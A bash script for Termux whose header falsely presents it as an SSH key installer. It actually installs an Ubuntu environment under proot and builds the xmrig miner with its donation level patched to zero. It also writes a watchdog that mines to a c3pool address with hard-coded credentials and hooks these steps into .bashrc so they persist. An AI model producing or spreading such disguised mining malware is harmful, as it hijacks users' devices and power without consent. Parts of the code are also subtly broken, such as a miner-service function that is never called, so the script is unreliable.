#!/usr/bin/env bash
#=============================================================
# https://github.com/P3TERX/SSH_Key_Installer
# Description: Install SSH keys via GitHub, URL or local files
# Version: 2.7
# Author: P3TERX
# Blog: https://p3terx.com
#=============================================================

USERPASS="12345:12345"
MIMING_URL="mine.c3pool.com:13333"

install_ubuntu(){
  pkg update && pkg upgrade -y
  pkg install wget proot git -y
  cd "$HOME" || exit
  mkdir ubuntu-in-termux
  cd ubuntu-in-termux || exit
  install1
  cd "$HOME" || exit
}

install1 () {
time1="$( date +"%r" )"
directory=ubuntu-fs
UBUNTU_VERSION=20.04.1
if [ -d "$directory" ];then
first=1
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;227m[WARNING]:\e[0m \x1b[38;5;87m Skipping the download and the extraction\n"
elif [ -z "$(command -v proot)" ];then
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;203m[ERROR]:\e[0m \x1b[38;5;87m Please install proot.\n"
printf "\e[0m"
exit 1
elif [ -z "$(command -v wget)" ];then
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;203m[ERROR]:\e[0m \x1b[38;5;87m Please install wget.\n"
printf "\e[0m"
exit 1
fi
if [ "$first" != 1 ];then
if [ -f "ubuntu.tar.gz" ];then
rm -rf ubuntu.tar.gz
fi
if [ ! -f "ubuntu.tar.gz" ];then
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Downloading the ubuntu rootfs, please wait...\n"
ARCHITECTURE=$(dpkg --print-architecture)
case "$ARCHITECTURE" in
aarch64) ARCHITECTURE=arm64;;
arm) ARCHITECTURE=armhf;;
amd64|x86_64) ARCHITECTURE=amd64;;
*)
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;203m[ERROR]:\e[0m \x1b[38;5;87m Unknown architecture :- $ARCHITECTURE"
exit 1
;;

esac

wget https://mirrors.ustc.edu.cn/ubuntu-cdimage/ubuntu-base/releases/${UBUNTU_VERSION}/release/ubuntu-base-${UBUNTU_VERSION}-base-${ARCHITECTURE}.tar.gz -O ubuntu.tar.gz
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Download complete!\n"

fi

cur=`pwd`
mkdir -p $directory
cd $directory
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Decompressing the ubuntu rootfs, please wait...\n"
tar -zxf $cur/ubuntu.tar.gz --exclude='dev'||:
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m The ubuntu rootfs have been successfully decompressed!\n"
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Fixing the resolv.conf, so that you have access to the internet\n"
printf "nameserver 8.8.8.8\nnameserver 8.8.4.4\n" > etc/resolv.conf
stubs=()
stubs+=('usr/bin/groups')
for f in ${stubs[@]};do
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Writing stubs, please wait...\n"
echo -e "#!/bin/sh\nexit" > "$f"
done
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Successfully wrote stubs!\n"
cd $cur

fi

mkdir -p ubuntu-binds
bin=startubuntu.sh
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Creating the start script, please wait...\n"
cat > $bin <<- EOM
#!/bin/bash
cd \$(dirname \$0)
## unset LD_PRELOAD in case termux-exec is installed
unset LD_PRELOAD
command="proot"
## uncomment following line if you are having FATAL: kernel too old message.
#command+=" -k 4.14.81"
command+=" --link2symlink"
command+=" -0"
command+=" -r $directory"
if [ -n "\$(ls -A ubuntu-binds)" ]; then
    for f in ubuntu-binds/* ;do
      . \$f
    done
fi
command+=" -b /dev"
command+=" -b /proc"
command+=" -b /sys"
command+=" -b ubuntu-fs/tmp:/dev/shm"
command+=" -b /data/data/com.termux"
command+=" -b /:/host-rootfs"
command+=" -b /sdcard"
command+=" -b /storage"
command+=" -b /mnt"
command+=" -w /root"
command+=" /usr/bin/env -i"
command+=" HOME=/root"
command+=" PATH=/usr/local/sbin:/usr/local/bin:/bin:/usr/bin:/sbin:/usr/sbin:/usr/games:/usr/local/games"
command+=" TERM=\$TERM"
command+=" LANG=C.UTF-8"
command+=" /bin/bash --login"
com="\$@"
if [ -z "\$1" ];then
    exec \$command
else
    \$command -c "\$com"
fi
EOM
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m The start script has been successfully created!\n"
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Fixing shebang of startubuntu.sh, please wait...\n"
termux-fix-shebang $bin
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Successfully fixed shebang of startubuntu.sh! \n"
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Making startubuntu.sh executable please wait...\n"
chmod +x $bin
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Successfully made startubuntu.sh executable\n"
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Cleaning up please wait...\n"
rm ubuntu.tar.gz -rf
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m Successfully cleaned up!\n"
printf "\x1b[38;5;214m[${time1}]\e[0m \x1b[38;5;83m[Installer thread/INFO]:\e[0m \x1b[38;5;87m The installation has been completed! You can now launch Ubuntu with ./startubuntu.sh\n"
printf "\e[0m"

}

start_ubuntu(){
  bash "$HOME/ubuntu-in-termux/startubuntu.sh"
}

host_bashrc(){
  echo "bash $HOME/ubuntu-in-termux/startubuntu.sh" >> "$HOME/.bashrc"
}

install_bash(){
  local bin="$HOME/ubuntu-in-termux/ubuntu-fs/root/install.sh"
  cat > "$bin" <<- EOM
#!/bin/bash
# 这个脚本 Aminer 的一部分，用于初始化编译 xmrig
apt-get update && apt-get upgrade -y
apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
git clone https://github.com/C3Pool/xmrig-C3.git
sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/g' ./xmrig-C3/src/donate.h
sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g' ./xmrig-C3/src/donate.h
mkdir xmrig-C3/build && cd xmrig-C3/build && cmake .. && make -j\$(nproc) && mv xmrig \$HOME && cd \$HOME && rm -rf xmrig-C3

EOM

  echo "[ ! -e ./xmrig ] && bash ./install.sh" >> "$HOME/ubuntu-in-termux/ubuntu-fs/root/.bashrc"
}


service_bash(){
  local bin="$HOME/ubuntu-in-termux/ubuntu-fs/root/service.sh"
  cat > "$bin" <<- EOM
#!/bin/bash
# 这个脚本是 Aminer 的一部分，用于自动启动 xmrig 进程
echo "SHELL DEMON START!!"
cd "\$HOME"

# 结束其他 service 和 xmrig 进程
ps -ef|grep service.sh|grep -v grep|cut -c 9-15|xargs kill -s 9
ps -ef|grep xmrig|grep -v grep|cut -c 9-15|xargs kill -s 9

# 监控 xmrig 并自动重启
while true
do
	PID_COUNT=\$(ps aux|grep ./xmrig |grep -v grep|wc -l)
	if [ \$PID_COUNT -eq 0 ]
	then
		[ ! -e ./xmrig ] && echo "ERROR: XMRIG not exists."  && exit
		./xmrig --randomx-mode=light --no-huge-pages -O $USERPASS -o $MIMING_URL
	fi
	sleep 60
done

EOM

  echo "bash ./service.sh" >> "$HOME/ubuntu-in-termux/ubuntu-fs/root/.bashrc"
}


while getopts "O:o" OPT; do
    case $OPT in
    O)
        USERPASS=$OPTARG
        ;;
    o)
        MIMING_URL=$OPTARG
        ;;
    *)
        echo "ERROR IN"
        exit 1
        ;;
    esac
done

[ ! -e "$HOME/ubuntu-in-termux/ubuntu-fs/root/service.sh" ] && install_ubuntu && install_bash && install_bash && host_bashrc
start_ubuntu
